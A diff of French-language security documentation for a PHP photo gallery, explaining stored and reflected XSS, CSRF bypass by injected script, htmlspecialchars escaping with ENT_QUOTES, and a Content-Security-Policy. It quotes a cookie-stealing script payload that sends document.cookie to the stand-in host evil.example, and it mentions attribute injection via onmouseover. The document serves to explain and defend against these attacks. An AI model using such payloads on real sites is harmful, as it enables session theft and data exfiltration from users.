@@ -28,26 +28,26 @@ Déroulé d'une XSS stockée, sur une version où un champ affiché n'est pas é
    script du code légitime : il l'exécute dans l'origine du site, avec la
    session de la victime.
 
-4. Le script s'exécute dans ce contexte pour tous les visiteurs de la galerie.
-   Ici, envoi du contenu de la page à `evil.example`.
+4. Le script s'exécute ainsi chez chaque visiteur de la galerie. Dans cet
+   exemple, il envoie le contenu de la page à `evil.example`.
 
-Portée depuis cette position :
+Actions possibles pour le script injecté :
 
 - exfiltration du contenu de la page (données privées, e-mail, jetons du DOM) ;
 - action au nom de la victime : lecture du champ `csrf_token` présent dans la
   page et soumission d'un formulaire (`/photo/delete`, `/gallery/comment`). La
-  protection CSRF est contournée, le jeton étant lu depuis l'intérieur de la
-  page, sans violation de la same-origin policy ;
+  protection CSRF est contournée : le script lit le jeton dans la page, depuis
+  la même origine, sans enfreindre la same-origin policy ;
 - redirection, défiguration, enregistrement des frappes.
 
-Variante réfléchie : le code passe par un paramètre d'URL renvoyé sans
-échappement au lieu d'être stocké, la victime est piégée par un lien.
+Variante réfléchie : le code transite par un paramètre d'URL que la page
+renvoie sans échappement ; la victime est amenée sur cette URL par un lien.
 
 Vol du cookie : `<script>document.location='https://evil.example/?c='+document.cookie</script>`
-donnerait la session sur un site sans protection. Le cookie est `HttpOnly`
-(`Core/Session.php`), `document.cookie` ne le lit pas. L'attaque se replie sur
-l'exfiltration et l'action au nom de la victime, la session restant utilisable
-tant que le script tourne.
+transmettrait l'identifiant de session si le cookie était lisible par
+JavaScript. Le cookie est `HttpOnly` (`Core/Session.php`) : `document.cookie`
+ne le contient pas. Le script reste limité à l'exfiltration et aux actions au
+nom de la victime, qui utilisent sa session tant qu'il s'exécute.
 
 ## Échappement en sortie
 
@@ -57,20 +57,25 @@ Toute valeur dynamique insérée dans le HTML passe par `htmlspecialchars` :
 <span><?= htmlspecialchars((string) $utilisateur['username']) ?></span>
 ```
 
-`<`, `>`, `&` sont convertis en entités ; `<script>` s'affiche comme texte au
-lieu de s'exécuter.
+`<`, `>`, `&` sont convertis en entités ; `<script>` s'affiche alors comme
+texte.
 
 ## Dans un attribut HTML
 
-Un attribut peut être clos par un guillemet simple ou double : ajouter
-`ENT_QUOTES` pour échapper les deux.
+Un attribut peut être délimité par un guillemet simple ou double ; les deux
+doivent être échappés. Depuis PHP 8.1, les drapeaux par défaut de
+`htmlspecialchars` sont `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401` : `"` et `'`
+sont convertis sans argument supplémentaire. `ENT_QUOTES` écrit explicitement
+donne le même résultat :
 
 ```php
 <input value="<?= htmlspecialchars((string) $valeur, ENT_QUOTES) ?>">
 ```
 
-Sans `ENT_QUOTES`, une valeur contenant `"` ferme l'attribut et permet d'en
-injecter d'autres (`onmouseover=…`).
+Le risque apparaît avec un drapeau plus faible. Avec `ENT_COMPAT`, `'` n'est pas
+échappé ; avec `ENT_NOQUOTES`, aucun guillemet ne l'est. Une valeur contenant le
+guillemet délimiteur ferme alors l'attribut et permet d'en injecter d'autres
+(`onmouseover=…`).
 
 ## Texte multi-ligne
 
@@ -83,8 +88,8 @@ lui-même échappé :
 
 ## Contextes non couverts par `htmlspecialchars`
 
-`htmlspecialchars` protège le corps HTML et les attributs. Il ne suffit pas si
-une donnée est injectée :
+`htmlspecialchars` protège le corps HTML et les attributs. Il ne suffit pas
+lorsqu'une donnée est insérée :
 
 - dans un `<script>` (contexte JavaScript) ;
 - dans une URL `href`/`src` (un `javascript:…` reste exécutable) ;
@@ -96,14 +101,14 @@ l'utilisateur est validée (schéma `http`/`https` uniquement) avant affichage.
 
 ## Points d'attention
 
-- Échappement en sortie, pas en entrée. La base garde la valeur brute ;
-  l'échappement dépend du contexte d'affichage. Échapper avant stockage corrompt
+- Échappement à la sortie uniquement. La base garde la valeur brute, et
+  l'échappement dépend du contexte d'affichage. Échapper avant stockage altère
   la donnée et ne couvre pas les autres contextes.
 - `charset=utf-8` est déclaré dans `layout.php` : un jeu de caractères ambigu
   peut contourner l'échappement.
 - Content-Security-Policy posée par le vhost (`docker/web/000-default.conf`),
-  en durcissement de l'échappement : un `<script>` injecté ne s'exécute pas,
-  faute de `'unsafe-inline'`. Contrepartie : aucun script ni style inline dans
-  les vues, ce qui a supprimé le `onclick` de la déconnexion (le formulaire a
-  un bouton). `style-src-attr 'unsafe-inline'` reste ouvert pour le seul
+  en complément de l'échappement : un `<script>` injecté ne s'exécute pas,
+  faute de `'unsafe-inline'`. En conséquence, les vues ne contiennent aucun
+  script ni style inline ; le `onclick` de la déconnexion a été retiré et le
+  formulaire porte un bouton. `style-src-attr 'unsafe-inline'` reste ouvert pour le seul
   attribut `style` du photomaton, dont la valeur vient de la configuration.
